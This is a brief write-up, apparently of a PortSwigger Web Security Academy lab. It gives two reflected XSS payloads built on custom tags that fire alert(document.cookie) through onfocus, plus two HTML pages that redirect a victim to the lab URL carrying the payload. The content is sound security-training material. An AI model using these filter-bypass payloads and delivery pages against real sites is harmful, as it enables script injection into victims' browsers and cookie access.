---
title: Reflected XSS into HTML context with all tags blocked except custom ones
date: 2026-07-04
tags:
  - 
publish: true
draft: false
description: ""
---

#### Payload 1

```
<abc-def autofocus onfocus="alert(document.cookie)" tabindex=1>
```

#### Payload 2 

```
<abc-def id="abc" onfocus="alert(document.cookie)" tabindex=1>#abc
```


#### Deliver exploit to victim 

Create custom webpage and send it to victim : 

```html
<html>
<body>
<script>
window.location='https://0a4e00f60462f68980485e4d00e50040.web-security-academy.net/?search=<abc-def+id%3D"abc"+onfocus%3D"alert(document.cookie)"+tabindex%3D1>#abc'
</script>
</body>
</htm>
```

or 

```html
<html>
<body>
<script>
window.location='https://0a4e00f60462f68980485e4d00e50040.web-security-academy.net/?search=<abc-def+autofocus+onfocus%3D"alert(document.cookie)"+tabindex%3D1>'
</script>
</body>
</htm>
```